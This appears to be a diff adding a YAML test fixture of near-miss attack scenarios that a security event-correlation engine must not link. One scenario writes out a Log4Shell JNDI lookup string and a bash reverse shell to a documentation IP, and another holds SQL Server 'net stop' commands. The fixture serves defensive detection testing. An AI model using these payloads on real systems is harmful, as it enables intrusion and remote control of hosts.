@@ -1,0 +1,60 @@
+# Near-miss campaigns that must NOT correlate (wrong order, different entity, outside window).
+scenarios:
+- id: CHN-N01
+  name: Success before the spray
+  forbid_correlation: TB-COR-001
+  events:
+    - {at: 0, title: Login, event_type: authentication.brute_force_success, source_ip: 203.0.113.9}
+    - {at: 18, title: Spray, event_type: authentication.password_spraying, source_ip: 203.0.113.9}
+- id: CHN-N02
+  name: Spray and success from different IPs
+  forbid_correlation: TB-COR-001
+  events:
+    - {at: 0, title: Spray, event_type: authentication.password_spraying, source_ip: 203.0.113.9}
+    - {at: 18, title: Login, event_type: authentication.brute_force_success, source_ip: 203.0.113.99}
+- id: CHN-N03
+  name: Spray and success three hours apart (window is two hours)
+  forbid_correlation: TB-COR-001
+  events:
+    - {at: 0, title: Spray, event_type: authentication.password_spraying, source_ip: 203.0.113.9}
+    - {at: 180, title: Login, event_type: authentication.brute_force_success, source_ip: 203.0.113.9}
+- id: CHN-N04
+  name: Exploit and shell on different hosts
+  forbid_correlation: TB-COR-003
+  events:
+    - {at: 0, title: HTTP request, event_type: web.request, asset_name: web-03, raw_data: {user_agent: "${jndi:ldap://203.0.113.5:1389/x}"}}
+    - {at: 3, title: Process creation, event_type: process.start, asset_name: web-04, command_line: "bash -c 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'"}
+- id: CHN-N05
+  name: Same precursor repeated is not a pair
+  forbid_correlation: TB-COR-012
+  events:
+    - {at: 0, title: Process creation, event_type: process.start, asset_name: srv-db-3, command_line: "net stop \"SQL Server (MSSQLSERVER)\" /y"}
+    - {at: 7, title: Process creation, event_type: process.start, asset_name: srv-db-3, command_line: "net stop \"SQL Server Agent (MSSQLSERVER)\" /y"}
+- id: CHN-N06
+  name: Eight failed logins is below the burst threshold
+  forbid_correlation: TB-COR-013
+  events:
+    - {at: 0, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 1, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 2, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 3, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 4, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 5, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 6, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+    - {at: 7, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.72}
+- id: CHN-N07
+  name: Many failures but spread over two hours
+  forbid_correlation: TB-COR-013
+  events:
+    - {at: 0, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 12, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 24, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 36, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 48, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 60, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 72, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 84, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 96, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 108, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 120, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
+    - {at: 132, title: Failed login, event_type: authentication.failed, source_ip: 203.0.113.73}
